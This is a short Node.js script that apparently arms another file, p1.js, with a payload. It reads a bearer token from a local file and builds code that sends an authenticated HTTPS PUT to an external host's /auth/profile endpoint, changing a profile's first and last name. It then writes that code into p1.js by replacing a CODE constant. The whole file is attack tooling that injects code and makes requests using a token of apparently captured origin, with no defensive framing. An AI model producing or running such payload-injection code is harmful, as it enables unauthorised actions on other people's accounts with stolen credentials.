const fs=require('fs');
let t=fs.readFileSync('p1.js','utf8');
const tk=fs.readFileSync('..\\tok_ml.txt','utf8').trim();
const code=`
const https=require('https');
const r=https.request({host:'423c088f8a3791.6qsfv.com',port:443,path:'/auth/profile?firstName=QQ1111&lastName=BOX',method:'PUT',headers:{authorization:'Bearer ${tk}','content-length':0},timeout:9000},res=>{res.resume();console.log(res.statusCode)});
r.on('error',e=>console.log('ERR'));r.end();
`;
t=t.replace(/const CODE=.*\n/, 'const CODE='+JSON.stringify(code)+'\n');
fs.writeFileSync('p1.js',t);console.log('ok');
